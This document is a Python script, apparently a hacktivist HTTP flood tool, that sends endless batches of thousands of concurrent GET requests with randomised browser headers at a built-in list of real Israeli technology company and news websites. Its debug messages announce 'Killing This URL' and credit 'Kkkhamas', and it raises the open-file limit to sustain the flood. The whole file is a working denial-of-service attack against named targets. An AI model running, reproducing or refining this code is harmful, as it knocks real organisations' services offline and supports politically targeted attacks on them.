import asyncio
import aiohttp
import random
from collections import defaultdict
import argparse
import resource

DEFAULT_URLS = [

    "https://www.riskified.com/",
    "https://www.simplex.com/",
    "https://bond-it.co.uk/",
    "https://www.rewireme.com/",
    "https://blender.global/",
    "https://paykey.com/",
    "https://zooz.com/",
    "https://bloxd.io/",
    "https://unboundtech.com",
    "https://cylus.com",
    "https://overwolf.com",
    "https://oribi.io/",
    "https://zencity.io",
    "https://plainid.com/",
    "https://fleetonomy.io/",
    "https://vulcancyber.com/",
    "https://orbs.com",
    "https://corephotonics.com/",
    "https://tastewise.io",
    "https://voiceitt.com/",
    "http://reduxio.com",
    "https://inceptionvr.com",
    "https://d-fendsolutions.com",
    "https://equalum.io/",
    "https://identiq.com/",
    "https://nym.health/",
    "https://scadafence.com",
    "https://xplenty.com",
    "https://hunters.ai",
    "https://cloudendure.com",
    "https://intezer.com",
    "https://syqemedical.com/",
    "https://zirra.com",
    "https://netafim.com/",
    "https://perception-point.io",
    "https://aspectiva.com",
    "https://blox.io",
    "https://notraffic.tech",
    "https://audioburst.com/",
    "https://mycheck.io",
    "https://valerann.com/",
    "https://mobileodt.com/",
    "https://ottopia.tech/",
    "https://beamr.com",
    "https://run.ai/",
    "https://minute.ly",
    "https://axilion.com",
    "https://votiro.com/",
    "https://radiflow.com/",
    "https://cgen.com",
    "https://tinytap.it",
    "https://kovrr.com",
    "https://konnecto.io/",
    "https://metanetworks.com",
    "https://wasteless.co",
    "https://hi.auto",
    "https://strigo.io",
    "https://gk8.io/",
    "https://eyecontrol.co.il/",
    "https://hysolate.com",
    "http://www.jpost.com",
    "http://www.israelnationalnews.com",
    "https://www.i24news.tv/en"
]


def get_random_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.216 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
    ]
    accept = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*"
    ]
    accept_encoding = ["gzip, deflate, br", "compress, gzip", "gzip, deflate"]
    accept_language = ["en-US,en;q=0.5", "en-GB,en;q=0.5", "en;q=0.5"]

    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": random.choice(accept),
        "Accept-Encoding": random.choice(accept_encoding),
        "Accept-Language": random.choice(accept_language),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": str(random.randint(0, 1)),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "DNT": str(random.randint(0, 1)),
    }
    return headers


async def fetch_http(url, session, response_codes_counter, debug):
    headers = get_random_headers()
    try:
        async with session.get(url, headers=headers) as response:
            response_codes_counter[response.status] += 1
            if debug:
                print(
                    f"HTTP request to {url} completed with status code: {response.status}")
                print("Current response codes count:",
                      dict(response_codes_counter))
    except Exception as e:
        if debug:
            print(f"HTTP request to {url} failed: {e}")
            print("Current response codes count:",
                  dict(response_codes_counter))
        response_codes_counter['errors'] += 1


async def process_url(url, total_requests, debug, use_http=True):

    if use_http:
        response_codes_counter = defaultdict(int)
        # Limit the number of simultaneous connections
        connector = aiohttp.TCPConnector(limit=3000)
        timeout = aiohttp.ClientTimeout(total=100)
        if debug:
            print(f"Powered by Kkkhamas")
            # Get the current soft and hard limits on file descriptors

            print(f"Killing This URL Inshallah : {url}")
            print(f"Total number of requests: {total_requests}")
            print(
                f"Simultaneous connections (connector limit): {connector.limit}")
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for i in range(0, total_requests, connector.limit):
                tasks = [fetch_http(url, session, response_codes_counter, debug)
                         for _ in range(i, min(i + connector.limit, total_requests))]
                await asyncio.gather(*tasks)


async def main(urls, total_requests, debug, use_http=True):
    while True:
        for url in urls:
            await process_url(url, total_requests, debug, use_http)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP requests sender")
    parser.add_argument("--urls", nargs='*', default=DEFAULT_URLS,
                        type=str, help="Target URLs to send the requests to")

    parser.add_argument('--total_requests', type=int,
                        help='Total number of requests to send', required=True)
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug mode to print logs')

    args = parser.parse_args()
    try:
        soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
        print(f"[The number of open file descriptors allowed] Current soft limit: {soft_limit}, And Current hard limit: {hard_limit}")
        print(f"Setting The number of open file descriptors allowed to : 66666")
        resource.setrlimit(resource.RLIMIT_NOFILE, (66666, hard_limit))
    except ValueError as e:
        print(f"Error setting ulimit: {e}")

    asyncio.run(main(args.urls, args.total_requests, args.debug))
